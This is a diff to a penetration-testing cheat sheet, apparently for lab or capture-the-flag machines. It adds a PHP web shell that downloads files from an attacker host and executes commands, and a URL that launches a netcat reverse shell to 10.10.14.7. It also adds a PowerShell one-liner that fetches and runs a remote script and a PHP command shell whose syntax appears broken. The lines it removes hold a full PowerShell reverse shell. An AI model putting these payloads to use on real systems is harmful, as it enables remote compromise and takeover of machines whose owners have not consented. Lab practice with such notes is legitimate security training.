@@ -139,7 +139,6 @@ Install droopescan via pip https://github.com/SamJoan/droopescan
 
     droopescan scan drupal -u <targetIP> -> Scan takes a long time
 
-
 *Page does not load*
 
 That is the case if only 443 is available and you know the DNS by scanning the SSL cert. 
@@ -799,6 +798,8 @@ Shellcode to create a reverse shell
 
     https://github.com/GammaG/php-reverse-shell
 
+    /usr/share/webshells/php/simple-backdoor.php
+
 Get the php file and change the ip and port where the shell should connect to.
 
     nc -nvlp 4444
@@ -869,6 +870,23 @@ on DVWA the page is called via parameter "?page=" enter here the malicious page 
     go to the folder you want to use
     python -m pyftpdlib -p 21
     p for port
+
+*PHP Reverse shell upload*
+
+    <?php 
+        if (isset($_REQUEST['fupload'])) {
+            file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.7:7777/" . $_REQUEST['fupload']));
+        };  
+
+        if (isset($_REQUEST['fexec'])) {
+            echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+        };
+    ?>
+
+Upload and execute the payload download nc64.exe and upload via fupload and execute a reverse shell via nc64.exe
+
+    <url>?fupload=ms15-051x64.exe&fexec=ms15-051x64.exe "nc64.exe -e cmd 10.10.14.7 5555"
+
 
 *get files over windows shell*
 
@@ -977,6 +995,15 @@ Other
 
 - exploit suggester (metasploit) https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/ 
 
+*PowerUp Shell*
+
+    locate PowerUp.ps1
+    and cp 
+
+Download with CMD
+
+    echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8000/PowerUp.ps1') | powershell -noprofile -
+
 **Linux**
 
 *show current path*
@@ -995,6 +1022,13 @@ Will create a reverse shell with a php shell and cleanup on its own. Need Wordpr
 *Find the Kernel version*
 
     uname -a -> on the local maschine
+
+*PHPShell*
+
+    <?php echo(system(system($_GET["cmd"])); ?>
+
+Can be used with PHP filter module.
+
 
 *Linuxprivchecker*
 
@@ -1386,13 +1420,10 @@ login into the new account
 
     psexec.py <domain>/<user>@host
 
-**Windows Post Exploitation**
+*Powershell Download *
 
-*Powershell Reverse Shell*
-
-    $client = New-Object System.Net.Sockets.TCPClient("10.9.96.27",444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 
+    Invoke-WebRequest $url -OutFile $path_to_file
+    
 
 **Windows PW Cracking**
 
